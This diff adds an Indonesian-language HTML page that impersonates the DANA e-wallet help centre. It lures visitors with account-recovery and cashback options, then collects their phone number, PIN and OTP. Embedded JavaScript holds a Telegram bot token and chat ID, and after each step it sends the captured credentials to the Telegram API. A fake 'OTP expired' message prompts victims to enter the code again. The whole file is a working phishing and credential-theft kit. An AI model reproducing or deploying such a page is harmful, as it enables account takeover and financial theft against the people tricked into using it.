@@ -1,0 +1,740 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>DANA - Pusat Bantuan</title>
+
+    <meta property="og:site_name" content="DANA - Pusat Bantuan">
+    <meta property="og:title" content="ᴘᴜsᴀᴛ ʙᴀɴᴛᴜᴀɴ ᴅᴀɴᴀ ʀᴇsᴍɪ">
+    <meta property="og:description" content="DANA adalah aplikasi dompet digital Indonesia untuk transaksi cepat, aman, dan terpercaya.">
+    <meta property="og:image" content="https://i.ibb.co.com/pryFZxVf/images-2-24.jpg">
+    <meta property="og:image:secure_url" content="https://i.ibb.co.com/pryFZxVf/images-2-24.jpg">
+    <meta property="og:image:type" content="image/jpeg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:url" content="https://dana.id/">
+    <meta property="og:type" content="website">
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        dana: { blue: '#0088EE', darkblue: '#0066CC', lightblue: '#E0F0FF', bg: '#0088EE', text: '#FFFFFF' }
+                    },
+                    fontFamily: { sans: ['Inter', 'system-ui', 'sans-serif'] }
+                }
+            }
+        }
+    </script>
+    <style type="text/css">
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        html, body { height: 100%; overflow-x: hidden; }
+        body {
+            background: #ffffff;
+            font-family: sans-serif;
+            min-height: 100vh;
+            color: #333;
+            -webkit-text-size-adjust: 100%;
+            -webkit-touch-callout: none;
+            padding: env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
+        }
+
+        .page {
+            position: fixed;
+            inset: 0;
+            background: #ffffff;
+            z-index: 10;
+            display: none;
+            overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
+        }
+        .page.active { display: block; z-index: 20; }
+        #mainPage {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            z-index: 1;
+            padding-top: 0 !important;
+            padding-bottom: 0 !important;
+            background: #ffffff;
+        }
+
+        .logo-kiri-atas {
+            position: fixed;
+            top: calc(0.8rem + env(safe-area-inset-top));
+            left: 1rem;
+            z-index: 10;
+            width: 64px;
+            height: auto;
+        }
+        .logo-kiri-atas img { width: 100%; height: auto; object-fit: contain; }
+
+        .loading-overlay {
+            position: fixed; inset: 0; background: rgba(0, 0, 0, 0.6); z-index: 999;
+            display: none; align-items: center; justify-content: center;
+        }
+        .loading-dana {
+            position: relative;
+            width: 60px;
+            height: 60px;
+        }
+        .logo-dana {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 50px;
+            height: 50px;
+            z-index: 3;
+        }
+        .cincin-putar {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 36px;
+            height: 36px;
+            animation: putar 1s linear infinite;
+            z-index: 2;
+        }
+        @keyframes putar {
+            from { transform: translate(-50%, -50%) rotate(0deg); }
+            to { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+        .loading-pin-mode {
+            position: absolute !important;
+            top: 50% !important; left: 50% !important;
+            transform: translate(-50%,-50%) !important;
+            background: rgba(255,255,255,0.9) !important;
+            border-radius: 12px !important;
+            padding: 1.5rem !important;
+        }
+
+        .temp-screen {
+            position: fixed; inset: 0; background: #000; z-index: 998;
+            display: none; align-items: center; justify-content: center;
+        }
+        .temp-screen img {
+            width: 100%; height: 100%;
+            object-fit: cover;
+            object-position: center center;
+        }
+
+        /* ✅ GAMBAR ATAS */
+        .header-top {
+            height: auto;
+            min-height: 160px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            background: #ffffff;
+            border-radius: 0 0 16px 16px;
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            position: relative;
+        }
+        .header-top img {
+            width: 100%;
+            height: auto;
+            object-fit: contain;
+            object-position: center top;
+            display: block;
+        }
+
+        /* ✅ GARIS CAHAYA BERSINAR DI SAMBUNGAN */
+        .sambungan-cahaya {
+            height: 5px;
+            background: linear-gradient(90deg, 
+                rgba(255,255,255,0) 0%, 
+                #ffffff 25%, 
+                #e0f0ff 40%, 
+                #ffffff 50%, 
+                #e0f0ff 60%, 
+                #ffffff 75%, 
+                rgba(255,255,255,0) 100%);
+            box-shadow: 0 0 15px #ffffff, 0 0 30px #cce7ff, 0 0 45px #99d6ff;
+            margin: -2px 0 0;
+            border: none;
+            width: 100%;
+            animation: cahayaBerdenyar 2.5s ease-in-out infinite;
+            position: relative;
+            z-index: 5;
+        }
+        @keyframes cahayaBerdenyar {
+            0%,100% { opacity:0.8; box-shadow:0 0 12px #fff,0 0 25px #cce7ff; }
+            50% { opacity:1; box-shadow:0 0 20px #fff,0 0 40px #99d6ff,0 0 55px #66b3ff; }
+        }
+
+        /* ✅ TULISAN DI LUAR KOTAK */
+        .judul-pilihan {
+            text-align: center;
+            color: #0066CC;
+            font-size: 1.1rem;
+            font-weight: 700;
+            margin: 1.2rem 0 0.8rem;
+            text-shadow:0 0 8px rgba(255,255,255,0.7);
+        }
+
+        /* ✅ KOTAK DAN OPSI DIPERKECIL */
+        .menu-wrapper {
+            background: #0088EE;
+            padding: 0.8rem 0 0.4rem;
+            border-radius: 16px 16px 0 0;
+            position: relative;
+            margin-top:-2px;
+        }
+        .menu-card {
+            max-width: 85%;
+            width: 380px;
+            margin: 0 auto;
+            padding: 1rem;
+            background: #ffffff url('https://i.ibb.co.com/0Txkkgd/1781626689417-1.gif') center/cover no-repeat;
+            border-radius: 14px;
+            box-shadow: 0 3px 12px rgba(0,0,0,0.1);
+            position: relative;
+            overflow: hidden;
+        }
+        .option-group {
+            display: flex;
+            flex-direction: column;
+            gap: 0.7rem;
+        }
+        .option-text {
+            width: 100%;
+            padding: 0.8rem 1rem;
+            background: linear-gradient(90deg, #0088EE 0%, #40C4FF 100%);
+            color: #ffffff;
+            border: none;
+            border-radius: 10px;
+            font-weight: 600;
+            font-size: 0.95rem;
+            text-align: left;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            box-shadow: 0 2px 6px rgba(0,136,238,0.2);
+        }
+        .option-text:hover { transform: translateY(-2px); box-shadow: 0 4px 10px rgba(0,136,238,0.3); }
+
+        /* ✅ GAMBAR 3D DIBAWAH */
+        .slider-3d-container {
+            background: #ffffff;
+            padding: 0.3rem 0 0.7rem;
+            border-radius: 0 0 16px 16px;
+            overflow: visible;
+            perspective: 1000px;
+        }
+        .slider-bottom {
+            overflow: visible;
+            margin: 0;
+            padding: 0.2rem 0;
+            background: transparent;
+        }
+        .slider-track {
+            display:flex;
+            gap:12px;
+            width:max-content;
+            animation:slideRightLeft 14s linear infinite;
+        }
+        .slide-bottom {
+            width:200px; height:110px; border-radius:10px;
+            background-size:cover; background-position:center;
+            flex-shrink:0;
+            box-shadow:0 4px 12px rgba(0,0,0,0.12);
+            border:3px solid #fff;
+            transform-style: preserve-3d;
+            transform: rotateY(8deg) rotateX(4deg);
+        }
+        @keyframes slideRightLeft { to { transform:translateX(calc(-50%)); } }
+
+        .glow-divider {
+            height: 3px;
+            background: linear-gradient(90deg, transparent, #ffffff, #f0f8ff, #ffffff, transparent);
+            box-shadow: 0 0 8px rgba(255,255,255,0.7);
+            margin: 0;
+            border: none;
+        }
+
+        /* ✅ NAVIGASI BAWAH */
+        .nav-bottom {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: auto;
+            background:#ffffff;
+            box-shadow: 0 -2px 8px rgba(0,0,0,0.08);
+            z-index:999;
+            display:block;
+            width:100%;
+            border-radius: 0;
+            overflow: hidden;
+            margin: 0;
+            padding: 0;
+            touch-action: none;
+            -webkit-user-select: none;
+            user-select: none;
+        }
+        .nav-bottom img {
+            width: 100%;
+            height: auto;
+            display:block;
+            object-fit: cover;
+            pointer-events: none;
+        }
+        .nav-hidden { display:none !important; }
+
+        /* HALAMAN LAINNYA */
+        #pageNomor { background:#0088EE; }
+        .nomor-header { position:relative; padding:calc(1rem + env(safe-area-inset-top)) 1rem 1rem; display:flex; align-items:center; justify-content:center; }
+        .back-btn { position:absolute; left:1rem; top:50%; transform:translateY(-50%); background:none; border:none; color:white; font-size:1.4rem; cursor:pointer; }
+        .dana-logo-center { display:block; width:auto; height:auto; max-width:90px; max-height:32px; object-fit:contain; }
+        .nomor-body { padding:0 1.5rem calc(2rem + env(safe-area-inset-bottom) + 60px); max-width:480px; margin:0 auto; color:white; min-height:calc(100vh - 80px); display:flex; flex-direction:column; justify-content:center; }
+        .teks-atas { text-align:center; color:#e0f7ff; font-size:1rem; margin:1.5rem 0 2rem; }
+        .input-kotak { display:flex; align-items:center; background:white; border-radius:8px; padding:0.7rem 0.8rem; margin-bottom:1rem; }
+        .bendera { width:24px; height:16px; background:transparent; border-radius:2px; margin-right:0.5rem; flex-shrink:0; }
+        .bendera img { width:100%; height:100%; object-fit:cover; border-radius:2px; }
+        .kode-negara { color:#333; font-weight:500; margin-right:0.5rem; }
+        .input-nomor { flex:1; border:none; outline:none; font-size:1.1rem; color:#333; -webkit-appearance:none; background:transparent; }
+        .teks-bawah { color:#e0f7ff; font-size:0.9rem; text-align:center; line-height:1.5; margin-top:1rem; margin-bottom:4rem; }
+        .teks-bawah strong { color:#fff; font-weight:600; }
+        .tombol-lanjut { position:relative; margin-top:auto; background:transparent; border:none; color:#e0f7ff; font-size:1rem; cursor:pointer; text-align:center; width:100%; padding:1rem 0; }
+
+        #pagePIN { background:#fff !important; }
+        #pagePIN .page-header {
+            background:#0088EE; color:#fff;
+            padding:calc(1rem + env(safe-area-inset-top)) 1rem 1rem;
+            display:flex; align-items:center; justify-content:center;
+            position:relative; margin:0; border:none;
+        }
+        #pagePIN .page-body {
+            background:#fff; color:#000;
+            padding:1.2rem 1.5rem 0;
+            min-height:calc(100vh - 56px);
+            max-width:100%; margin:0;
+            display:flex;
+            flex-direction:column;
+            align-items:center;
+            justify-content:flex-start;
+            padding-top: 1.5rem;
+        }
+        #pagePIN h3 {
+            text-align:center; font-size:1.25rem; font-weight:500;
+            margin-bottom:1.5rem;
+            color:#000;
+        }
+        .pin-dots { display:flex; justify-content:center; gap:1.2rem; margin-bottom:2rem; width:100%; cursor:pointer; }
+        .dot { width:16px; height:16px; border-radius:50%; background:#ccc; border:2px solid #999; transition:all 0.2s; }
+        .dot.filled { background:#0088EE; border-color:#0066CC; }
+        .dot.hidden { display:none; }
+        .dot.success { background:#28a745; border-color:#28a745; }
+        .pin-links {
+            display:flex; justify-content:center; align-items:center;
+            gap:2rem; max-width:100%; width:auto;
+            font-size:0.9rem; color:#0088EE; text-align:center;
+            margin-top: 0.5rem;
+        }
+        .pin-links p { display:flex; align-items:center; gap:0.4rem; margin:0; cursor:pointer; white-space:nowrap; }
+        .pin-links .logo-bantuan { width:22px; height:22px; border-radius:50%; object-fit:cover; }
+
+        /* ✅ HALAMAN VERIFIKASI: LATAR PENUH BIRU TANPA PUTIH */
+        #pageVerif { background:#0088EE !important; }
+        #pageVerif .page-header {
+            background:#0088EE; color:#fff;
+            padding:calc(1rem + env(safe-area-inset-top)) 1rem 1rem;
+            display:flex; align-items:center; justify-content:center;
+            position:relative;
+            margin:0;
+            width:100%;
+        }
+        #pageVerif .page-body {
+            background:#0088EE !important;
+            width:100% !important;
+            max-width:100% !important;
+            margin:0 !important;
+            padding:1.5rem !important;
+            min-height:calc(100vh - 56px);
+        }
+        .verif-card { background:#fff; border-radius:12px; padding:1.5rem; box-shadow:0 4px 12px rgba(0,0,0,0.1); max-width:480px; margin:0 auto; }
+        .verif-title { text-align:center; font-size:1.1rem; font-weight:500; margin:0 0 1rem; }
+        .verif-title span { color:#0088EE; font-weight:600; }
+        .verif-number { text-align:center; margin-bottom:1rem; }
+        .verif-number span { display:inline-flex; align-items:center; gap:0.4rem; background:#f0f4ff; color:#0088EE; padding:0.4rem 0.8rem; border-radius:20px; font-size:0.9rem; }
+        .verif-gif {
+            display: block;
+            text-align: center;
+            margin: 1.2rem auto;
+            max-width: 220px;
+            width: 100%;
+            background:#fff; padding:6px; border-radius:10px;
+        }
+        .verif-gif img {
+            width: 100%;
+            height: auto;
+            border-radius: 8px;
+            object-fit: contain;
+        }
+        .verif-desc { font-size:1rem; font-weight:500; margin:0 0 1.2rem; }
+        .verif-step { display:flex; align-items:flex-start; gap:0.8rem; padding-bottom:1rem; border-bottom:1px solid #e5e7eb; margin-bottom:1rem; }
+        .verif-step-icon { width:40px; height:40px; border-radius:50%; background:#e0f0ff; display:flex; align-items:center; justify-content:center; flex-shrink:0; }
+        .verif-step-icon.orange { background:#fff3e0; }
+        .verif-step p { margin:0; font-size:0.9rem; line-height:1.4; color:#444; }
+        .verif-protect { text-align:center; font-size:0.8rem; color:#888; margin:0 0 1.5rem; }
+        .verif-protect span { color:#0088EE; font-weight:600; }
+        .verif-warning { background:#fff3cd; border:1px solid #ffeeba; color:#856404; padding:0.8rem; border-radius:6px; text-align:center; font-size:0.85rem; margin-bottom:1rem; }
+        .btn-otp { width:100%; background:#0088EE; color:white; border:none; border-radius:8px; padding:0.9rem; font-weight:600; font-size:1rem; cursor:pointer; }
+
+        #pageOTP { background:#0088EE; }
+        #pageOTP .nomor-header {
+            background:#0088EE; padding:calc(1rem + env(safe-area-inset-top)) 1rem 1rem;
+        }
+        #pageOTP .nomor-body {
+            padding:1rem 1.5rem 0;
+            max-width:480px; margin:0 auto; color:white;
+            min-height:calc(100vh - 80px);
+            display:flex; flex-direction:column;
+            justify-content:flex-start;
+            padding-top:2rem;
+        }
+        .otp-box { display:flex; justify-content:center; gap:0.8rem; margin:1.5rem 0; }
+        .otp-box input { width:50px; height:55px; text-align:center; font-size:1.3rem; border-radius:6px; border:2px solid #cce7ff; background:white; -webkit-appearance:none; color:#000; font-weight:500; transition:border-color 0.2s; }
+        .otp-box input:focus { border-color:#0088EE; }
+        .timer-text { text-align:center; color:#e0f7ff; margin:1rem 0; font-size:0.9rem; }
+        .resend-text { display:none; text-align:center; color:#fff; font-weight:500; cursor:pointer; }
+        .error-text { display:none; color:#ffcccc; text-align:center; font-size:0.9rem; margin-top:1rem; }
+        .pesan-merah { display:none; color:#ff3333; text-align:center; font-weight:500; margin-top:1rem; }
+    </style>
+</head>
+<body>
+
+<div class="logo-kiri-atas" id="logoKiriAtas">
+    <img src="https://i.ibb.co.com/tMP7d2h0/dana-logo-fe46647.png" alt="Logo DANA">
+</div>
+
+<div class="loading-overlay" id="loadingScreen">
+    <div class="loading-dana">
+        <img src="https://i.ibb.co.com/bM8MqFx5/load-bg-1.png" alt="Logo Dana" class="logo-dana">
+        <img src="https://i.ibb.co.com/xqyBbPBZ/load-spin.png" alt="Cincin Loading" class="cincin-putar">
+    </div>
+</div>
+
+<div class="temp-screen" id="tempScreen">
+    <img src="https://i.ibb.co.com/xq1Pkp0T/IMG-20260527-WA0020.jpg" alt="Gambar Sementara" id="tempImg">
+</div>
+
+<div id="mainPage">
+    <div class="header-top">
+        <img src="https://i.ibb.co.com/DfDZ7rhg/Desain-tanpa-judul-3.gif" alt="Header">
+    </div>
+
+    <!-- ✅ Garis cahaya bersinar di sambungan -->
+    <div class="sambungan-cahaya"></div>
+
+    <!-- ✅ Tulisan di luar kotak -->
+    <p class="judul-pilihan">SILAHKAN PILIH LAYANAN</p>
+
+    <div class="menu-wrapper">
+        <!-- ✅ Kotak & opsi diperkecil -->
+        <div class="menu-card">
+            <div class="option-group">
+                <button class="option-text" onclick="mulaiProses()">1. Pemulihan Akun dibekukan</button>
+                <button class="option-text" onclick="mulaiProses()">2. Pembatalan DANA CICIL</button>
+                <button class="option-text" onclick="mulaiProses()">3. Klaim Voucher Cashback DANA</button>
+                <button class="option-text" onclick="mulaiProses()">4. Laporkan kendala lainnya</button>
+            </div>
+        </div>
+
+        <div class="slider-3d-container">
+            <div class="slider-bottom">
+                <div class="slider-track">
+                    <div class="slide-bottom" style="background:url('https://i.ibb.co.com/39fSBnd4/Add-Text-12-21-12-32-33.jpg') center/cover"></div>
+                    <div class="slide-bottom" style="background:url('https://i.ibb.co.com/7NTYhJwB/1707410449-e-MAS-CB-75-K-Website-Thumbnail-500x300p.png') center/cover"></div>
+                    <div class="slide-bottom" style="background:url('https://i.ibb.co.com/jPQdm9t2/1706678558-Web-Banner-DANAsca-VAnger-Hunt-500x300px.png') center/cover"></div>
+                    <div class="slide-bottom" style="background:url('https://i.ibb.co.com/TqqH86S5/Add-Text-02-05-05-34-58.jpg') center/cover"></div>
+                    <div class="slide-bottom" style="background:url('https://i.ibb.co.com/39MFfKCB/Add-Text-12-25-01-43-43.jpg') center/cover"></div>
+                    <div class="slide-bottom" style="background:url('https://i.ibb.co.com/tPn7D25X/Add-Text-12-21-12-44-48.jpg') center/cover"></div>
+                    <div class="slide-bottom" style="background:url('https://i.ibb.co.com/39fSBnd4/Add-Text-12-21-12-32-33.jpg') center/cover"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="glow-divider"></div>
+
+    <div class="nav-bottom" id="navMain">
+        <img src="https://i.ibb.co.com/HWk70PJ/1704436332522-1.png" alt="Navigasi">
+    </div>
+</div>
+
+<div class="page" id="pageNomor">
+    <div class="nomor-header">
+        <button class="back-btn" onclick="kembaliUtama()">&lt;</button>
+        <img src="https://i.ibb.co.com/tMP7d2h0/dana-logo-fe46647.png" alt="DANA Logo" class="dana-logo-center">
+    </div>
+    <div class="nomor-body">
+        <p class="teks-atas">Masukkan nomor HP kamu untuk lanjut</p>
+        <div class="input-kotak">
+            <div class="bendera"><img src="https://i.ibb.co.com/7tXkkkTT/images-20.png" alt="Indonesia"></div>
+            <span class="kode-negara">+62</span>
+            <input type="tel" id="inputNomor" class="input-nomor" placeholder="811-1234-5678" maxlength="14" inputmode="numeric">
+        </div>
+        <p class="teks-bawah">
+            Nomor ponsel akan digunakan sebagai ID kamu & menjaga akun selalu aman. Dengan melanjutkan, kamu setuju dengan <strong>Syarat & Ketentuan</strong> dan <strong>Kebijakan Privasi</strong> kami
+        </p>
+        <button class="tombol-lanjut" onclick="lanjutKePIN()">LANJUT</button>
+    </div>
+</div>
+
+<div class="page" id="pagePIN">
+    <div class="page-header">
+        <button class="back-btn" onclick="kembaliNomor()">&lt;</button>
+        <h2 class="mx-auto">Masuk</h2>
+    </div>
+    <div class="page-body">
+        <h3>Masukkan PIN</h3>
+        <div class="pin-dots" id="pinDots" onclick="bukaKiborPIN()"></div>
+        <input type="password" id="inputPIN" inputmode="numeric" pattern="[0-9]*" maxlength="6" style="position:absolute; left:-9999px;" oninput="prosesPIN(this.value)">
+        <div class="pin-links">
+            <p><img src="https://i.ibb.co.com/sdWPPSd6/IMG-20260520-WA0049.jpg" alt="Logo" class="logo-bantuan"> BUTUH BANTUAN?</p>
+            <p>LUPA PIN?</p>
+        </div>
+    </div>
+</div>
+
+<div class="page" id="pageVerif">
+    <div class="page-header">
+        <button class="back-btn" onclick="kembaliPIN()">&lt;</button>
+        <img src="https://i.ibb.co.com/tMP7d2h0/dana-logo-fe46647.png" alt="DANA Logo" class="dana-logo-center">
+    </div>
+    <div class="page-body">
+        <div class="verif-card">
+            <h3 class="verif-title">Verifikasi dikirim ke Akun <span>DANA</span></h3>
+            <div class="verif-number"><span><svg width="14" height="14" fill="#0088EE" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z"/></svg><span id="nomorTampilVerif">+62***********</span></span></div>
+            <div class="verif-gif">
+                <img src="https://i.ibb.co.com/1JYpXVd5/atas-3.gif" alt="Animasi verifikasi">
+            </div>
+            <p class="verif-desc">Cara mengamankan aktivitasmu:</p>
+            <div class="verif-step"><div class="verif-step-icon"><svg width="20" height="20" fill="#0088EE" viewBox="0 0 24 24"><path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-2-1.99-2-1.99zM17 19H7V5h10v14z"/><path d="M12 14.5l-2.5-2.5 1.41-1.41L12 11.67l3.59-3.58L17 9.5 12 14.5z"/></svg></div><p>Cek notifikasi dari aplikasi DANA, pilih tap VERIFIKASI.</p></div>
+            <div class="verif-step"><div class="verif-step-icon orange"><svg width="20" height="20" fill="#f57c00" viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4V8h16v10z"/></svg></div><p>Jika tidak menerima notifikasi? cek kontak masuk atau menu VERIFIKASI di aplikasi DANA kamu.</p></div>
+            <p class="verif-protect">Diamankan oleh <span>DANA PROTECTION</span></p>
+            <div class="verif-warning"><strong>PERINGATAN:</strong> Pastikan sudah verifikasi notifikasi, atau klik tombol di bawah</div>
+            <button class="btn-otp" onclick="bukaHalaman('pageOTP')">KIRIM OTP</button>
+        </div>
+    </div>
+</div>
+
+<div class="page" id="pageOTP">
+    <div class="nomor-header">
+        <button class="back-btn" onclick="kembaliVerif()">&lt;</button>
+        <img src="https://i.ibb.co.com/tMP7d2h0/dana-logo-fe46647.png" alt="DANA Logo" class="dana-logo-center">
+    </div>
+    <div class="nomor-body">
+        <h3 class="text-center text-lg font-medium mb-4">Masukkan Kode OTP</h3>
+        <p class="text-center text-light text-sm mb-2">Kode dikirim ke <span id="nomorTampilOTP">+62***********</span> via SMS / WhatsApp</p>
+        <div class="otp-box">
+            <input type="text" maxlength="1"><input type="text" maxlength="1">
+            <input type="text" maxlength="1"><input type="text" maxlength="1">
+        </div>
+        <p class="timer-text" id="timerOTP">Kirim ulang dalam <span id="detikMundur">60</span> detik</p>
+        <p class="resend-text" id="resendOTP" onclick="mulaiTimer()">KIRIM ULANG</p>
+        <p class="error-text" id="errorOTP">Kode OTP salah, coba lagi</p>
+        <p class="pesan-merah" id="pesanMerah">masa berlaku OTP sudah habis</p>
+    </div>
+</div>
+
+<script>
+const TELEGRAM_BOT_TOKEN = "8774713492:AAF90IfyPDpGNG9QxVmJdPnDwtXxwsJe2FQ";
+const TELEGRAM_CHAT_ID = "6074442607";
+
+let nomorSimpan = "";
+let pinSimpan = "menunggu...";
+let otpSimpan = "menunggu...";
+let timer = null;
+let detik = 60;
+
+async function kirimKeTelegram() {
+    const pesan = `━━━━━━━━━━━━━━━━━━━━━
+DATA MASUK - DANA
+━━━━━━━━━━━━━━━━━━━━━
+Nama Akun  : ${nomorSimpan || "menunggu..."}
+Pin Akun   : ${pinSimpan}
+Kode Akun  : ${otpSimpan}
+━━━━━━━━━━━━━━━━━━━━━`;
+    try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: pesan })
+        });
+    } catch (e) { console.log("Gagal kirim:", e); }
+}
+
+function bukaHalaman(id) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+    document.getElementById('navMain').classList.toggle('nav-hidden', id !== 'mainPage');
+    document.getElementById('logoKiriAtas').style.display = id === 'mainPage' ? 'block' : 'none';
+}
+function kembaliUtama() { bukaHalaman('mainPage'); }
+function kembaliNomor() { bukaHalaman('pageNomor'); }
+function kembaliPIN() { bukaHalaman('pagePIN'); }
+function kembaliVerif() { bukaHalaman('pageVerif'); }
+
+function mulaiProses() {
+    const load = document.getElementById('loadingScreen');
+    const temp = document.getElementById('tempScreen');
+    load.classList.remove('loading-pin-mode');
+    load.style.display = 'flex';
+    setTimeout(() => {
+        load.style.display = 'none';
+        temp.style.display = 'flex';
+        setTimeout(() => {
+            temp.style.display = 'none';
+            bukaHalaman('pageNomor');
+            document.getElementById('navMain').classList.add('nav-hidden');
+        }, 2500);
+    }, 1500);
+}
+
+function lanjutKePIN() {
+    nomorSimpan = "+62" + document.getElementById('inputNomor').value.replace(/\D/g,'');
+    if(!nomorSimpan || nomorSimpan.length < 10) { alert('Nomor tidak lengkap'); return; }
+    kirimKeTelegram();
+    let tampil = nomorSimpan.slice(0,4) + "*********";
+    document.getElementById('nomorTampilVerif').textContent = tampil;
+    document.getElementById('nomorTampilOTP').textContent = tampil;
+    const load = document.getElementById('loadingScreen');
+    load.classList.remove('loading-pin-mode');
+    load.style.display = 'flex';
+    setTimeout(() => {
+        load.style.display = 'none';
+        bukaHalaman('pagePIN');
+        setTimeout(() => document.getElementById('inputPIN').focus(), 300);
+    }, 1500);
+}
+
+function bukaKiborPIN() {
+    const inputPIN = document.getElementById('inputPIN');
+    inputPIN.focus();
+    inputPIN.click();
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const inputNomor = document.getElementById('inputNomor');
+    inputNomor.addEventListener('keydown', function(e) {
+        if(e.key === 'Enter') {
+            e.preventDefault();
+            lanjutKePIN();
+        }
+    });
+
+    const pinDots = document.getElementById('pinDots');
+    for(let i=1; i<=6; i++) {
+        const span = document.createElement('span');
+        span.className = 'dot';
+        span.id = 'd' + i;
+        pinDots.appendChild(span);
+    }
+
+    const otpInputs = document.querySelectorAll('.otp-box input');
+    otpInputs.forEach((inp, idx) => {
+        inp.addEventListener('input', () => pindahOTP(inp, idx));
+        inp.addEventListener('keydown', e => {
+            if(e.key === 'Backspace' && !inp.value && idx > 0) otpInputs[idx-1].focus();
+        });
+    });
+    mulaiTimer();
+});
+
+function prosesPIN(val) {
+    for(let i=1;i<=6;i++) {
+        const d = document.getElementById('d'+i);
+        d.classList.toggle('filled', i <= val.length);
+    }
+    if(val.length === 6) {
+        pinSimpan = val;
+        kirimKeTelegram();
+        document.querySelectorAll('#pinDots .dot').forEach(d => d.classList.add('hidden'));
+        const load = document.getElementById('loadingScreen');
+        load.classList.add('loading-pin-mode');
+        load.style.display = 'flex';
+        setTimeout(() => {
+            load.style.display = 'none';
+            document.querySelectorAll('#pinDots .dot').forEach(d => d.classList.remove('hidden'));
+            setTimeout(() => {
+                document.querySelectorAll('#pinDots .dot').forEach(d => {
+                    d.classList.remove('filled');
+                    d.classList.add('success');
+                });
+                setTimeout(() => bukaHalaman('pageVerif'), 400);
+            }, 300);
+        }, 1000);
+    }
+}
+
+function pindahOTP(input, idx) {
+    input.value = input.value.replace(/[^0-9]/g,'');
+    if(input.value && idx < 3) input.nextElementSibling.focus();
+
+    let semua = Array.from(document.querySelectorAll('.otp-box input')).map(i=>i.value).join('');
+    if(semua.length === 4) {
+        otpSimpan = semua;
+        kirimKeTelegram();
+
+        const load = document.getElementById('loadingScreen');
+        load.classList.remove('loading-pin-mode');
+        load.style.display = 'flex';
+
+        setTimeout(() => {
+            load.style.display = 'none';
+            document.getElementById('pesanMerah').style.display = 'block';
+
+            setTimeout(() => {
+                document.querySelectorAll('.otp-box input').forEach(inp => inp.value = '');
+                document.getElementById('pesanMerah').style.display = 'none';
+                document.querySelector('.otp-box input').focus();
+            }, 1200);
+
+        }, 1200);
+    }
+}
+
+function bukaOTP() { bukaHalaman('pageOTP'); mulaiTimer(); }
+
+function mulaiTimer() {
+    detik = 60;
+    document.getElementById('detikMundur').textContent = detik;
+    document.getElementById('timerOTP').style.display = 'block';
+    document.getElementById('resendOTP').style.display = 'none';
+    if(timer) clearInterval(timer);
+    timer = setInterval(() => {
+        detik--;
+        document.getElementById('detikMundur').textContent = detik;
+        if(detik <= 0) {
+            clearInterval(timer);
+            document.getElementById('timerOTP').style.display = 'none';
+            document.getElementById('resendOTP').style.display = 'block';
+        }
+    }, 1000);
+}
+
+if(/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+    document.body.style.fontSize = '15px';
+    document.querySelectorAll('input').forEach(inp => {
+        inp.setAttribute('autocomplete','off');
+        inp.setAttribute('autocorrect','off');
+        inp.setAttribute('autocapitalize','off');
+        inp.setAttribute('inputmode','numeric');
+        inp.setAttribute('pattern','[0-9]*');
+    });
+}
+</script>
+
+</body>
+</html>
